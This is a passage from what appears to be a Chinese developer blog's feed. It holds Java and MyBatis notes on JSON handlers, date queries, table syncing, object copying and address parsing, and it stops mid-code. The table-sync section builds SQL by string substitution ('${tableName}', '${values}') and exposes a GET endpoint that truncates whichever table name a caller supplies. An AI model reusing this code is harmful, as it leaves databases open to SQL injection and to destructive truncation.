<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            ps<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>parameter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>LinkedHashMap<span class="token operator">></span> <span class="token function">getResult</span><span class="token punctuation">(</span>ResultSet rs<span class="token punctuation">,</span> String columnName<span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException <span class="token punctuation">{</span>        String str <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>columnName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> StringUtils<span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> JSON<span class="token punctuation">.</span><span class="token function">parseArray</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>LinkedHashMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>LinkedHashMap<span class="token operator">></span> <span class="token function">getResult</span><span class="token punctuation">(</span>ResultSet rs<span class="token punctuation">,</span> <span class="token keyword">int</span> columnIndex<span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException <span class="token punctuation">{</span>        String str <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>columnIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> StringUtils<span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> JSON<span class="token punctuation">.</span><span class="token function">parseArray</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>LinkedHashMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>LinkedHashMap<span class="token operator">></span> <span class="token function">getResult</span><span class="token punctuation">(</span>CallableStatement cs<span class="token punctuation">,</span> <span class="token keyword">int</span> columnIndex<span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException <span class="token punctuation">{</span>        String str <span class="token operator">=</span> cs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span>columnIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> StringUtils<span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> JSON<span class="token punctuation">.</span><span class="token function">parseArray</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>LinkedHashMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><ul><li>传参示例</li></ul><pre class=" language-json"><code class="language-json"><span class="token punctuation">[</span>    <span class="token punctuation">{</span>        <span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"/statics/2023/04/04/87e6412f-7478-45f4-8ea8-9b6ff5aedcff.jpeg"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"台湾居民来往大陆通行证正面"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        <span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"/statics/2023/04/04/55aaee9b-deda-42a9-be94-9345738e5f6a.png"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"台湾居民来往大陆通行证反面"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        <span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"/statics/2023/04/04/e49cefa9-2478-4535-8040-e9a55bff5654.png"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"健保核退申请书"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        <span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"/statics/2023/04/04/830f49fc-56e0-494a-8e7d-08612eaa8f3a.png"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"护照证明文件"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        <span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"/statics/2023/04/04/403d7b5e-9822-4e50-afda-00e7d285231b.gif"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"台湾地区银行卡或存折"</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><p>原型示例</p><p><img src="/images/%E5%8E%9F%E5%9E%8B%E7%A4%BA%E4%BE%8BJSON.png"></p><p>对应字段类型为JSON</p><p><img src="/images/JSON%E5%AD%97%E6%AE%B5%E6%93%8D%E4%BD%9C.png"></p><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> JSON </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时间范围查询</title>
      <link href="/2022/03/22/shi-jian-fan-wei-cha-xun/"/>
      <url>/2022/03/22/shi-jian-fan-wei-cha-xun/</url>
      
        <content type="html"><![CDATA[<h1 id="Mybatis时间范围查询"><a href="#Mybatis时间范围查询" class="headerlink" title="Mybatis时间范围查询"></a>Mybatis时间范围查询</h1><pre class=" language-sql"><code class="language-sql">             <span class="token operator">&lt;</span><span class="token keyword">if</span> test<span class="token operator">=</span><span class="token string">"req.startTime !=null "</span><span class="token operator">></span>                <span class="token operator">and</span> date_format<span class="token punctuation">(</span>t<span class="token punctuation">.</span>update_date<span class="token punctuation">,</span><span class="token string">'%y-%m-%d'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">=</span> date_format<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#{req.startTime},'%y-%m-%d')</span>            <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token keyword">if</span> test<span class="token operator">=</span><span class="token string">"req.endTime !=null "</span><span class="token operator">></span>                <span class="token operator">and</span> date_format<span class="token punctuation">(</span>t<span class="token punctuation">.</span>update_date<span class="token punctuation">,</span><span class="token string">'%y-%m-%d'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">=</span> date_format<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#{req.endTime},'%y-%m-%d')</span>            <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token operator">></span></code></pre><h1 id="TKMybatis时间范围查询"><a href="#TKMybatis时间范围查询" class="headerlink" title="TKMybatis时间范围查询"></a>TKMybatis时间范围查询</h1><pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>ObjectUtil<span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span>applySearchVo<span class="token punctuation">.</span><span class="token function">getStartTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   criteria<span class="token punctuation">.</span><span class="token function">andGreaterThanOrEqualTo</span><span class="token punctuation">(</span><span class="token string">"createTime"</span><span class="token punctuation">,</span>applySearchVo<span class="token punctuation">.</span><span class="token function">getStartTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ObjectUtil<span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span>applySearchVo<span class="token punctuation">.</span><span class="token function">getEndTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   SimpleDateFormat df <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   String format <span class="token operator">=</span> df<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>applySearchVo<span class="token punctuation">.</span><span class="token function">getEndTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   String endTime <span class="token operator">=</span> format<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">" 23:59:59"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   criteria<span class="token punctuation">.</span><span class="token function">andLessThanOrEqualTo</span><span class="token punctuation">(</span><span class="token string">"createTime"</span><span class="token punctuation">,</span>endTime<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Mybatis </category>
          
          <category> TK-Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis复杂查询、自增id返回</title>
      <link href="/2022/03/21/mybatis-fu-za-cha-xun/"/>
      <url>/2022/03/21/mybatis-fu-za-cha-xun/</url>
      
        <content type="html"><![CDATA[<h1 id="Mybatis复杂查询"><a href="#Mybatis复杂查询" class="headerlink" title="Mybatis复杂查询"></a>Mybatis复杂查询</h1><p><img src="/images/mybatis%E5%A4%8D%E6%9D%82%E6%9F%A5%E8%AF%A21.png" alt="image-20240216231353051"></p><p><img src="/images/mybatis%E5%A4%8D%E6%9D%82%E6%9F%A5%E8%AF%A22.png" alt="image-20240216231426893"></p><p><img src="/images/Mybatis%E5%A4%8D%E6%9D%82%E6%9F%A5%E8%AF%A23.png" alt="image-20240216231501604"></p><h1 id="Mybatis自增id返回"><a href="#Mybatis自增id返回" class="headerlink" title="Mybatis自增id返回"></a>Mybatis自增id返回</h1><p><code>&lt;insert&gt;</code>标签的<code>useGeneratedKeys</code>：设置为 true，表示使用自增主键返回</p>]]></content>
      
      
      <categories>
          
          <category> Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不同数据库间表同步接口</title>
      <link href="/2022/03/21/bu-tong-shu-ju-ku-jian-biao-shu-ju-tong-bu/"/>
      <url>/2022/03/21/bu-tong-shu-ju-ku-jian-biao-shu-ju-tong-bu/</url>
      
        <content type="html"><![CDATA[<h1 id="不同数据库间表同步接口"><a href="#不同数据库间表同步接口" class="headerlink" title="不同数据库间表同步接口"></a>不同数据库间表同步接口</h1><h2 id="yml配置"><a href="#yml配置" class="headerlink" title="yml配置"></a>yml配置</h2><p><img src="/images/%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5yml.png" alt="配置"></p><h2 id="接口类"><a href="#接口类" class="headerlink" title="接口类"></a>接口类</h2><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Mapper</span><span class="token annotation punctuation">@DS</span><span class="token punctuation">(</span><span class="token string">"master"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">DataSyncDao</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Select</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM ${tableName}"</span><span class="token punctuation">)</span>    List<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> <span class="token function">getDataFromTable</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"tableName"</span><span class="token punctuation">)</span> String tableName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Select</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM ${tableName} LIMIT #{pageSize} OFFSET #{offset}"</span><span class="token punctuation">)</span>    List<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> <span class="token function">getDataFromTableByPage</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"tableName"</span><span class="token punctuation">)</span> String tableName<span class="token punctuation">,</span> <span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"pageSize"</span><span class="token punctuation">)</span> <span class="token keyword">int</span> pageSize<span class="token punctuation">,</span> <span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"offset"</span><span class="token punctuation">)</span> <span class="token keyword">int</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Mapper</span><span class="token annotation punctuation">@DS</span><span class="token punctuation">(</span><span class="token string">"slave"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">DataSyncDaoIntranet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Update</span><span class="token punctuation">(</span><span class="token string">"TRUNCATE TABLE ${tableName}"</span><span class="token punctuation">)</span>    <span class="token keyword">void</span> <span class="token function">clearTable</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"tableName"</span><span class="token punctuation">)</span> String tableName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Insert</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO ${tableName} (${columns}) VALUES (${values})"</span><span class="token punctuation">)</span>    <span class="token keyword">void</span> <span class="token function">insertDataIntoTable</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"tableName"</span><span class="token punctuation">)</span> String tableName<span class="token punctuation">,</span> <span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"columns"</span><span class="token punctuation">)</span> String columns<span class="token punctuation">,</span> <span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"values"</span><span class="token punctuation">)</span> String values<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Service类"><a href="#Service类" class="headerlink" title="Service类"></a>Service类</h2><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SyncService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> DataSyncDao dataSyncDao<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> DataSyncDaoIntranet dataSyncDaoIntranet<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 表数据同步     *     * @Author: CZM     * @Param: [tableName]     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">syncData</span><span class="token punctuation">(</span>String tableName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//清空表</span>        dataSyncDaoIntranet<span class="token punctuation">.</span><span class="token function">clearTable</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 每页查询的行数</span>        <span class="token keyword">int</span> pageSize <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 当前页码</span>        <span class="token keyword">int</span> pageNum <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> data<span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token punctuation">(</span>pageNum <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> pageSize<span class="token punctuation">;</span>            data <span class="token operator">=</span> dataSyncDao<span class="token punctuation">.</span><span class="token function">getDataFromTableByPage</span><span class="token punctuation">(</span>tableName<span class="token punctuation">,</span> pageSize<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 插入数据到目标表</span>            <span class="token comment" spellcheck="true">// 每批插入的行数</span>            <span class="token keyword">int</span> batchSize <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> batchSize<span class="token punctuation">)</span> <span class="token punctuation">{</span>                List<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> batch <span class="token operator">=</span> data<span class="token punctuation">.</span><span class="token function">subList</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>i <span class="token operator">+</span> batchSize<span class="token punctuation">,</span> data<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 获取源表的列名</span>                Set<span class="token operator">&lt;</span>String<span class="token operator">></span> columnNames <span class="token operator">=</span> batch<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> Collections<span class="token punctuation">.</span><span class="token function">emptySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> batch<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String columns <span class="token operator">=</span> StringUtils<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>columnNames<span class="token punctuation">,</span> <span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String values <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> row <span class="token operator">:</span> batch<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>String key <span class="token operator">:</span> row<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">//字段值含单引号需替换</span>                        values <span class="token operator">+=</span> <span class="token string">"'"</span> <span class="token operator">+</span> row<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"''"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"',"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    values <span class="token operator">=</span> values<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> values<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    values <span class="token operator">+=</span> <span class="token string">"),("</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                values <span class="token operator">=</span> values<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> values<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dataSyncDaoIntranet<span class="token punctuation">.</span><span class="token function">insertDataIntoTable</span><span class="token punctuation">(</span>tableName<span class="token punctuation">,</span> columns<span class="token punctuation">,</span> values<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            pageNum<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="Controller类"><a href="#Controller类" class="headerlink" title="Controller类"></a>Controller类</h2><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>tags <span class="token operator">=</span> <span class="token string">"数据同步"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"ign"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> SyncService syncService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"syncService"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"数据同步"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>String<span class="token operator">></span> <span class="token function">getToken</span><span class="token punctuation">(</span>String tableName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ResultData<span class="token operator">&lt;</span>String<span class="token operator">></span> resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            syncService<span class="token punctuation">.</span><span class="token function">syncData</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">;</span>            resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token string">"同步成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> 数据同步 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java对象拷贝</title>
      <link href="/2022/03/14/dui-xiang-kao-bei/"/>
      <url>/2022/03/14/dui-xiang-kao-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="对象拷贝"><a href="#对象拷贝" class="headerlink" title="对象拷贝"></a>对象拷贝</h1><ul><li>相当于get/set代码。</li><li>BeanUtils.copyProperties()：浅拷贝，会拷贝<strong>属性名称</strong>和<strong>属性类型</strong>相同的属性。<code>BeanUtils.copyProperties(A对象, B对象);    //A对象拷贝到B对象</code></li></ul><ul><li>除BeanUtils外还有一个名为<strong>PropertyUtils</strong>的工具类，它也提供copyProperties()方法，作用与BeanUtils的同名方法十分相似，主要的区别在于后者提供类型转换功能，即发现两个JavaBean的同名属性为不同类型时，在支持的数据类型范围内进行转换，而前者不支持这个功能，但是速度会更快一些</li></ul><p><strong>注意</strong>：属性类型不同的问题、空格问题、误传问题</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java地址解析</title>
      <link href="/2022/03/12/java-di-zhi-jie-xi/"/>
      <url>/2022/03/12/java-di-zhi-jie-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="java地址解析"><a href="#java地址解析" class="headerlink" title="java地址解析"></a>java地址解析</h1><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>lang3<span class="token punctuation">.</span>StringUtils<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span>Matcher<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span>Pattern<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AddressParser</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String address1 <span class="token operator">=</span> <span class="token string">"四川省成都市武侯区天府三街市区A栋2302号"</span><span class="token punctuation">;</span>        String address2 <span class="token operator">=</span> <span class="token string">"北京市朝阳区三里屯SOHO 8号楼2205室"</span><span class="token punctuation">;</span>        String address3 <span class="token operator">=</span> <span class="token string">"上海市浦东新区张江镇创业路188弄68号101室"</span><span class="token punctuation">;</span>        String address4 <span class="token operator">=</span> <span class="token string">"广东省深圳市南山区科技园高新南区C栋201室"</span><span class="token punctuation">;</span>        String address5 <span class="token operator">=</span> <span class="token string">"河北省保定市徐水区大柳树镇小区一号楼二单元302室"</span><span class="token punctuation">;</span>        String address6 <span class="token operator">=</span> <span class="token string">"内蒙古自治区包头市东河区大柳树镇小区一号楼二单元302室"</span><span class="token punctuation">;</span>        String address7 <span class="token operator">=</span> <span class="token string">"北京市朝阳区广顺北大街33号院1号楼10层1单元1101室10160号"</span><span class="token punctuation">;</span>        String address8 <span class="token operator">=</span> <span class="token string">"晋江市池店镇东山工业区"</span><span class="token punctuation">;</span>        <span class="token function">getAddress</span><span class="token punctuation">(</span>address1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">getAddress</span><span class="token punctuation">(</span>address2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">getAddress</span><span class="token punctuation">(</span>address3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">getAddress</span><span class="token punctuation">(</span>address4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">getAddress</span><span class="token punctuation">(</span>address5<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">getAddress</span><span class="token punctuation">(</span>address6<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">getAddress</span><span class="token punctuation">(</span>address7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">getAddress</span><span class="token punctuation">(</span>address8<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//{province=四川省, city=成都市, district=武侯区, detailAddress=天府三街市区A栋2302号}</span>    <span class="token comment" spellcheck="true">//{province=北京市, city=北京市, district=朝阳区, detailAddress=三里屯SOHO 8号楼2205室}</span>    <span class="token comment" spellcheck="true">//{province=上海市, city=上海市, district=浦东新区, detailAddress=张江镇创业路188弄68号101室}</span>    <span class="token comment" spellcheck="true">//{province=广东省, city=深圳市, district=南山区, detailAddress=科技园高新南区C栋201室}</span>    <span class="token comment" spellcheck="true">//{province=河北省, city=保定市, district=徐水区, detailAddress=大柳树镇小区一号楼二单元302室}</span>    <span class="token comment" spellcheck="true">//{province=内蒙古自治区, city=包头市, district=东河区, detailAddress=大柳树镇小区一号楼二单元302室}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span 